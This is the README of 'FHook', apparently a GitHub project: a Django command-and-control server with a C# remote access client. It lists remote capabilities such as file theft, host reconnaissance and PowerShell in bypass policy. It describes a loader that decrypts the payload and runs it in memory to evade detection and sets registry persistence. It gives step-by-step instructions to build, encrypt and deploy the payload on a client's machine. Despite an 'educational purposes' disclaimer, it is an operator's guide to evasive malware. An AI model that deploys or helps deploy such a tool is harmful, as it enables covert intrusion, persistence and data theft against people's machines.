# FHook
## What is FHook?
FHook is a Command and Control server which allows an individual to accept connections from multiple remote clients via a remote access tool. This is only for educational purposes, please do not use this to perform any form of illegal activity and always get permission prior to remoting into an individuals device.

It has been built on top of Django, which is a fullstack web framework powered by Python.

## Web Server Benefits
- Restart the server by clicking 1 button.
- Manage all file uploads and downloads.
![uploads](https://github.com/fish-not-phish/FHook-Django/assets/69283986/6468430c-a1bc-4ece-b81e-6baa40d33ecc)
- Account Management.
![acc_management](https://github.com/fish-not-phish/FHook-Django/assets/69283986/986d3e56-fd16-404f-8806-aa4afc26b990)
- Easily share one server amongst multiple individuals.

## C2 Features
- All network traffic is encrypted via TLS.
- Tracks current working directory.
  - Enables the server user to change directories on the client with ease.
- Gathers host machine information.
  - Network Interfaces Cards
  - Processor
  - RAM
  - GPU
  - Drives
  - Language
  - Location
- Checks user privileges.
- Download a file from the client.
- Upload a file to the client.
- List out current directory contents.
- Read from a file via standard output.
- Remove files from the client.
- Copy files from the client to a different destination on the client.
- Creating a directory on the client.
- Deleting a directory on the client.
- Listing out all processes and running services.
- Listing out the ARP tables.
- Listing all open/listening ports.
- List all current processes that have an opened, usable (minimized or unminimized) window.
- Allows the user to run PowerShell commands on demand in bypass policy.
  - Is a new instance of PowerShell for each command. The instance is NOT persistent.
  - May experience some issues with quotations and chained commands.
### Command Line GUI
![cli](https://github.com/fish-not-phish/FHook-Django/assets/69283986/58ec45e1-2f74-4472-93f2-969069b5c52d)
## Commands
![commands](https://github.com/fish-not-phish/FHook-Django/assets/69283986/91daf42f-61d7-412d-8d5c-9aeda64ac83e)
### Hook Selection
![hooks](https://github.com/fish-not-phish/FHook-Django/assets/69283986/b76ac081-5bd9-4de3-86dc-6ff1fe82ec57)
## Loader
The client payload is ran from a loader. The loader is responsible for decrypting and decoding the payload and then running the client payload in memory. This lowers the chances that the client payload will be detected.

The loader also establishes persistence when it is ran. It will check if a value exists for a registry key in a predefined location. If no value exists, a registry key will be created. 

# Deployment
## Django Web Server
Create a new directory in your perferred location.
```
mkdir C:\Users\<username>\server\
```
Change into that directory.
```
cd C:\Users\<username>\server\
```
Python3 version 3.4 or higher is required. Recommend downloading the most recent release.
Create a virtual environment.
```
python3 -m venv env
```
Activate the virtual environment that you just created.

For Windows:
```
C:/Path/To/EnvName/Scripts/Activate.ps1
```
For Linux:
```
source /envName/bin/activate
```
Install mandatory packages.
```
pip install -r requirements.txt
```
Start the Django project.
```
django-admin startproject c2 .
```
This should have created a folder named "c2" and have some files within it, like urls.py and settings.py.

Create the first (and only) app.
```
python manage.py startapp main
```
This should have created another folder named "main".

At this point, you can copy the code from my repository into your created directories that were created.

For the c2 folder, copy these files inside of the folder to replace the existing files:
- urls.py
- settings.py

For the main folder, copy these files inside of the folder to replace the existing files:
- static folder
- templates folder (the one inside of the main folder)
- management folder
- forms.py
- admin.py
- models.py
- urls.py
- views.py

Inside the server folder, copy the last templates folder (the one outside the main folder).

The heiarchy should look like below regarding the files that were copied:

- server
  - c2
    - settings.py
    - urls.py
  - env
  - main
    - management
    - static
    - templates
    - admin.py
    - forms.py
    - models.py
    - urls.py
  - templates (should have a folder in it called "account")
  - manage.py
  - requirements.txt

### Create OpenSSL Cert
Install OpenSLL if not already installed.
Windows can download it here. Linux can type the command below.
```
sudo apt install openssl
```
Run the below command and keep the key and cert in a safe location.
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```
### Code Changes You Need to Make
Variables to consider changing within run_server.py:
```
context.load_cert_chain(certfile='path_to_your_cert.pem',keyfile='path_to_your_key.pem')
IP_ADDRESS = "YOUR_SERVER_IP_ADDRESS"
python_path = r'C:\Path\To\Your\Virtual\Env\Python\Executable.exe'
manage_py = r'C:\Path\To\Your\Project\manage.py'
```
### Make Migrations and Migrate
```
python manage.py makemigrations
python manage.py migrate
```
### Create Superuser Account
```
python manage.py createsuperuser
```
Fill out all the needed data. Make a note of the email you used to create the account. Once complete enter the below commands so the user is tied to Django AllAuth.
```
python manage.py shell
from django.contrib.auth.models import User
user = User.objects.get(email="your_email")
user.is_admin=True
user.is_superuser=True
user.is_staff=True
user.save()
quit()
```
### Collect all Static Files
```
python manage.py collectstatic
```
## Prepare the Payload
I used the Visual Studio Suite for my development, so all my documentation will be for Visual Studio Suite.

On client.cs, the IPAddress server must be changed that you server IP.
```IPAddress server = IPAddress.Parse("YOUR_SERVER_IP");```

Using your preferred method, build the project using VS Code or Visual Studio Suite. 

Ensure to use .NET 4.8. You may need to edit your .csproj file to reflect below.
```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net48</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <LangVersion>10.0</LangVersion>
    <UseWindowsForms>true</UseWindowsForms>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="Microsoft.VisualBasic" Version="10.3.0" />
    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
    <PackageReference Include="System.Drawing.Common" Version="7.0.0" />
    <PackageReference Include="System.Management" Version="7.0.2" />
    <PackageReference Include="System.ServiceProcess.ServiceController" Version="7.0.1" />
	<Reference Include="System.Net.Http" />
  </ItemGroup>

</Project>
```
An executable should be created once the project is successfully built.

### Encrypt and Encode the Payload
Within the prepare.cs code, edit the filePath string to reflect the location of your payload executable.
```
string filePath = "C:\\Path\\To\\Your\\Payload.exe";
```
Run prepare.cs and you should receive your payload base64, key and IV. Save those for future use.

### Loader Setup
Place the previously saved payload base64, key and IV in the following places within loader.cs.
```
string base64EncryptedExecutable = "YOUR_BASE64";
string hexKey = "YOUR_KEY";
string hexIv = "YOUR_IV";
```
Build the loader.cs project now. You may need to make the same edits to the .csproj file again as noted above. Once complete, the payload is ready to be deployed.

# Run the Server
```
python manage.py runserver 0.0.0.0:8000
```
Open another terminal or powershell instance.
```
python manage.py run_server
```
Execute the loader on clients machine, if not already setup to auto-execute via the registry key upon startup.

The server and client should be communicating. 

## Restarting the Server
### Soft Restart
In the web GUI, go to "Restart" in the navigation bar and click it. Then click Submit to confirm.

### Hard Restart
If there are any unsolved errors, you can manually restart the server by closing the "run_server" instance, and opening a new terminal/powershell instance to run the same command again. You will need to do this everytime to perform a hard restart.

## Troubleshooting
In the unfortunate circumstance where you cannot kill the script from running, feel free to run the below python script.
```
for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
    if proc.info['name'] in ['python.exe', 'python3', 'python']:
        cmdline = ' '.join(proc.info['cmdline'])
        if 'manage.py' in cmdline and 'run_server' in cmdline:
            print(f"Killing process {proc.info['pid']}...")
            proc.kill()
```
